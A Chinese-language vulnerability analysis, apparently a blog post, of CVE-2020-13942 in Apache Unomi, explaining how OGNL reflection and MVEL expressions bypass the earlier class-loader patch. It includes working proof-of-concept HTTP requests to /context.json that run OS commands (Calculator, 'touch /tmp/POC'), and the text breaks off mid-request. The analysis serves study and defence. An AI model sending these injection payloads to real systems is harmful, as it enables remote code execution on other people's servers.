### 漏洞简介
  * 参考链接
    * 
    * 
    * 
上篇讲完了 CVE-2020-11975；  
现在是下篇 CVE-2020-13942。
漏洞简介:  
Checkmarx Security Research
Team绕过了上一个patch(修复CVE-2020-11975的代码)，再次实现了RCE，漏洞编号CVE-2020-13942。
远程攻击者发送带有了MVEL或OGNL表达式的请求，(因为MVEL和OGNL表达式可以包含任意类)，可导致远程代码执行(RCE)，权限就是Unomi应用程序的运行权限。
因为MVEL表达式和OGNL表达式，是由Unomi的包里的不同的"内部程序包"(internal
packages)里的不同的类进行计算/执行，所以CVE-2020-13942对应了2个独立的漏洞。
触发前提:  
Apache Unomi =1.5.2 修复了漏洞CVE-2020-13942.
漏洞评级:  
这2个漏洞(名为CVE-2020-13942)的CVS分数均为10.0, 因为它们能访问OS，还能破坏Unomi的机密性，完整性。
Timeline:  
June 24, 2020 – Vulnerability disclosed to Apache Unomi developers  
August 20, 2020 – Code with the mix merged to master branch  
November 13, 2020 – version 1.5.2 containing the fixed code is released  
November 17, 2020 – public disclosure
### 漏洞分析
为什么上一个patch(修复CVE-2020-11975的代码)可被绕过？
因为那个patch的`SecureFilteringClassLoader`依赖于这样一个假设:
“MVEL和OGNL表达式中的每个类都是通过使用`ClassLoader`类的`loadClass()`方法加载的。”
事实上，不通过调用`loadClass()`方法也能加载类。所以只要不调用loadClass()，就不会被`SecureFilteringClassLoader`限制,
也就是绕过了安全管控。
不调用`loadClass()`方法，怎么实现加载类的呢？
有2种注入办法，算是2个漏洞，编号都为CVE-2020-13942。
#### CVE-2020-13942 漏洞1 OGNL注入
下面这种方法可以在不调用`loadClass()`的情况下加载"OGNL表达式中的类"(classes inside OGNL expressions)。
例子:
以下这个表达式利用"反射"(reflections)来使用已经存在的、现有的Runtime对象，而不会调用`SecureFilteringClassLoader`的`loadClass()`方法。  
下面的表达式调用`Runtime.getruntime()`来得到Runtime对象，然后调用`exec()`。
    (#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).
    (#runtimemethod = #runtimeclass.getDeclaredMethods().
    {^ #this.name.equals(\"getRuntime\")}[0]).
    (#runtimeobject = #runtimemethod.invoke(null,null)).
    (#execmethod = #runtimeclass.getDeclaredMethods().
    {? #this.name.equals(\"exec\")}.
    {? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.
    {? #this.getParameters().length 
PoC: HTTP request with OGNL injection  
以下(PoC)HTTP请求中的OGNL表达式，得到了`Runtime`并使用Java reflection API执行了一条OS命令。
    POST /context.json HTTP/1.1
    Host: localhost:8181
    Connection: close
    Content-Length: 1143
    {
      "personalizations":[
        {
          "id":"gender-test_anystr",
          "strategy":"matching-first",
          "strategyOptions":{
            "fallback":"var2_anystr"
          },
          "contents":[
            {
              "filters":[
                {
                  "condition":{
                    "parameterValues":{
                      "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^  #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"))",
                      "comparisonOperator":"equals",
                      "propertyValue":"male_anystr"
                    },
                    "type":"profilePropertyCondition"
                  }
                }
              ]
            }
          ]
        }
      ],
      "sessionId":"test-demo-session-id"
    }
macOS
11.0.1下启动计算器`/System/Applications/Calculator.app/Contents/MacOS/Calculator`
payload看起来是一大堆字符，其实挺简单，比如执行系统命令`touch /tmp/POC`:  
只是用reflection API写了`Runtime r = Runtime.getRuntime(); r.exec("touch
/tmp/POC");`，并把它包装为OGNL语法。
Response如下(可能不重要，仅供参考)
    HTTP/1.1 200 OK
    Connection: close
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
    Access-Control-Allow-Credentials: true
    Access-Control-Allow-Methods: OPTIONS, POST, GET
    Set-Cookie: context-profile-id=79bbf636-11aa-4c3e-b276-2980c89874e9; Path=/; Expires=Wed, 24-Nov-2021 03:20:20 GMT; Max-Age=31536000
    Expires: Thu, 01 Jan 1970 00:00:00 GMT
    Set-Cookie: context-profile-id=49b58042-92d6-4fcf-bb60-9fc0f62d0b5a; Path=/; Expires=Wed, 24-Nov-2021 03:20:20 GMT; Max-Age=31536000
    Content-Type: application/json;charset=utf-8
    Server: Jetty(9.4.22.v20191022)
    {"profileId":"49b58042-92d6-4fcf-bb60-9fc0f62d0b5a","sessionId":"test-demo-session-id","profileProperties":null,"sessionProperties":null,"profileSegments":null,"filteringResults":null,"processedEvents":0,"personalizations":{"gender-test_anystr":["var2_anystr"]},"trackedConditions":[{"parameterValues":{"formId":"testFormTracking","pagePath":"/tracker/"},"type":"formEventCondition"}],"anonymousBrowsing":false,"consents":{}}
#### CVE-2020-13942 漏洞2 MVEL注入
事实上，由于MVEL表达式不是原始漏洞的一部分，所以SecurityFilteringClassLoader对MVEL注入问题的防御效果没有进行彻底的测试。也就是说它仅能涵盖了一部分情况。
MVEL表达式使用"已经实例化的类"(already instantiated
classes)，访问那些已经存在的、现有的对象，如`Runtime`或`System`，不会调用`loadClass()`方法。  
如，MVEL表达式 `Runtime r = Runtime.getRuntime(); r.exec("calc.exe");`
因为是访问已经存在的、现有的对象，而不是创建它，所以可绕过SecureFilteringClassLoader类引入的安全检查（见1.5.1版本的`ConditionContextHelper`类的`executeScript`方法）。
修复CVE-2020-11975之后，当时的最新版Unomi(1.5.1)下，可在"条件"(condition)内进行MVEL表达式的计算/运行，这个"条件"(condition)里包含了任意类。
下面的HTTP请求中有一个"条件"(condition)，该"条件"(condition)带有1个参数，这个参数包含了一条MVEL表达式:  
`script::Runtime r = Runtime.getRuntime(); r.exec("touch /tmp/POC");`
Unomi会解析这个值，并把`script::`之后的`Runtime r = Runtime.getRuntime(); r.exec("touch
/tmp/POC");`当作一条MVEL表达式去执行。
PoC: HTTP request with MVEL injection  
以下(PoC)HTTP请求中的MVEL表达式创建了一个Runtime对象并运行OS命令。
    POST /context.json HTTP/1.1
    Host: localhost:8181
    Connection: close
    Content-Length: 564
    {
        "filters": [
            {
                "id": "myfilter1_anystr",
                "filters": [
                    {
                        "condition": {
                             "parameterValues": {
                                "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");"
                            },
                            "type": "profilePropertyCondition"
                        }
                    }
                ]